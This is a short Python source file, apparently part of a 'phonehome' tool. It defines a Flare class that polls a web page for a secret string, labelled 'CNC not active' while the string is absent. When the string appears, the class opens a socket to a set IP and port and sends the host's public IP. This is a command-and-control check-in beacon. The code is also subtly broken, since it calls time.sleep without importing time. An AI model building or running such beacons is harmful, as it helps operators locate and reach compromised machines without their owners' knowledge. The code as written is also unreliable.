import sys
import socket
import requests
from phonehome.ip_tools import get_public_ip

class Flare(object):
    def __init__(self, link, delay, secret, dest_ip, dest_port):
        self.link, self.delay, self.secret, self.dest_ip, self.dest_port = link, delay, secret, dest_ip, dest_port

    def send_ip(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.dest_ip, self.dest_port))

        source_ip = get_public_ip()
        payload = bytearray(source_ip, 'utf8')
        sock.send(payload)

    def check_url(self):
        page = requests.get(self.link)

        if self.secret in page.text:
            return True
        else:
            return False

    def main_loop(self):
        while True:
            if not self.check_url():
                print("CNC not active")
                time.sleep(self.delay)
            else:
                self.send_ip()
                break

